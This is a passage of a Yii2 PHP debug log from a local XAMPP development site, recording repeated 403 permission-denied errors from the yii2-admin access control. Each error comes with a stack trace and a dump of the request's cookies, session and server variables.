#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('create', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('tienda/producto...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:47:49 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = []

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_UPGRADE_INSECURE_REQUESTS' => '1'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
    'HTTP_REFERER' => 'http://planealo.local/admin/route/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58679'
    'REDIRECT_URL' => '/tienda/producto/create'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/tienda/producto/create'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629669.4319
    'REQUEST_TIME' => 1769629669
]
2026-01-28 15:47:51 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('toolbar', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('debug/default/t...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:47:50 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = [
    'tag' => '697a67e62d4ee'
]

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html'
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_REFERER' => 'http://planealo.local/tienda/producto/create'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58679'
    'REDIRECT_URL' => '/debug/default/toolbar'
    'REDIRECT_QUERY_STRING' => 'tag=697a67e62d4ee'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => 'tag=697a67e62d4ee'
    'REQUEST_URI' => '/debug/default/toolbar?tag=697a67e62d4ee'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629670.7518
    'REQUEST_TIME' => 1769629670
]
2026-01-28 15:48:03 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('toolbar', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('debug/default/t...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:48:02 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = [
    'tag' => '697a67ed6212b'
]

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html'
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_REFERER' => 'http://planealo.local/admin/role/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58683'
    'REDIRECT_URL' => '/debug/default/toolbar'
    'REDIRECT_QUERY_STRING' => 'tag=697a67ed6212b'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => 'tag=697a67ed6212b'
    'REQUEST_URI' => '/debug/default/toolbar?tag=697a67ed6212b'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629682.9327
    'REQUEST_TIME' => 1769629682
]
2026-01-28 15:48:26 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('toolbar', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('debug/default/t...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:48:26 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = [
    'tag' => '697a6808c8bcf'
]

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => 'planealo.local'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0'
    'HTTP_ACCEPT' => 'text/html'
    'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest'
    'HTTP_REFERER' => 'http://planealo.local/admin/assignment/index'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT_LANGUAGE' => 'es,es-ES;q=0.9,en;q=0.8,ru;q=0.7,fr;q=0.6,it;q=0.5'
    'HTTP_COOKIE' => '_identity=9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A46%3A%22%5B1%2C%22FCxNRGJia25jro30ecX5r8yVk7nCuaOY%22%2C2592000%5D%22%3B%7D; _csrf=62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ%22%3B%7D; PHPSESSID=2nreelq6ih9vuja9usa43m96no'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at planealo.local Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => 'planealo.local'
    'SERVER_ADDR' => '127.0.0.1'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '127.0.0.1'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '58688'
    'REDIRECT_URL' => '/debug/default/toolbar'
    'REDIRECT_QUERY_STRING' => 'tag=697a6808c8bcf'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => 'tag=697a6808c8bcf'
    'REQUEST_URI' => '/debug/default/toolbar?tag=697a6808c8bcf'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769629706.181
    'REQUEST_TIME' => 1769629706
]
2026-01-28 15:48:32 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][error][yii\web\HttpException:403] yii\web\ForbiddenHttpException: No tiene permitido ejecutar esta acción. in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php:88
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\components\AccessControl.php(73): mdm\admin\components\AccessControl->denyAccess(Object(yii\web\User))
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\ActionFilter.php(83): mdm\admin\components\AccessControl->beforeAction(Object(yii\base\InlineAction))
#2 [internal function]: yii\base\ActionFilter->beforeFilter(Object(yii\base\ActionEvent))
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Component.php(653): call_user_func(Array, Object(yii\base\ActionEvent))
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(735): yii\base\Component->trigger('beforeAction', Object(yii\base\ActionEvent))
#5 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php(185): yii\base\Module->beforeAction(Object(yii\base\InlineAction))
#6 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\base\Controller->runAction('toolbar', Array)
#7 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('debug/default/t...', Array)
#8 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#9 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#10 {main}
2026-01-28 15:48:31 [127.0.0.1][1][2nreelq6ih9vuja9usa43m96no][info][application] $_GET = [
    'tag' => '697a680ec9513'
]

$_POST = []

$_FILES = []

$_COOKIE = [
